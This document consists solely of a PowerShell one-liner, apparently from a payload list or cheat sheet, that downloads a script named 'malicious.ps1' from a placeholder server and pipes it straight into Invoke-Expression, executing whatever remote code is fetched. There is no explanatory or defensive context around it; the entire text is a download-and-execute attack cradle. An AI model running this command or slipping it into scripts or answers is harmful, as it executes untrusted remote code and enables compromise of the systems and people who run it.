(new-object system.net.webclient).downloadstring('http://your_server/malicious.ps1') | IEX
